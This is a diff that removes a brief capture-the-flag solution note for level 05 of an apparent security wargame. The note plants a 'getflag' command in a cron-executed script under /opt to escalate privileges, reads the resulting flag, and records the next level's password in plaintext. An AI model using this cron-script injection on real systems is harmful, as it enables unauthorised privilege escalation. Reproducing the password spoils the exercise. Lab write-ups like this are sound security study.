@@ -1,8 +1,0 @@
-$>crontab /var/mail/level05
-$>echo "getflag > /tmp/flag" > /opt/openarenaserver/get_flag
-
-wait...
-
-$>cat /tmp/flag
-
-password lvl05 viuaaale9huek52boumoomioc
